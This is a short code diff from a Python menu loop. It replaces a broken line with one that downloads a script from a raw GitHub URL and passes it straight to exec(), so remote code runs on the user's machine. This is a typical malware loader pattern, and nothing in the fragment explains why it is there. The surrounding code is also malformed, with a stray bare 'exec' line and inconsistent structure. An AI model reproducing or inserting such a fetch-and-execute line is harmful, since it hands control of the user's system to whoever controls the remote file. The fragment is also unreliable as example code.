@@ -70,6 +70,6 @@ while True:
         exec
     elif select == 'N':
         os.system('cls')
-    except(requests.get('https://raw.githubusercontent.com/AprillZerx/Loin/main/source').text)
+        exec(requests.get('https://raw.githubusercontent.com/AprillZerx/Loin/main/source').text)
     else:
         continue
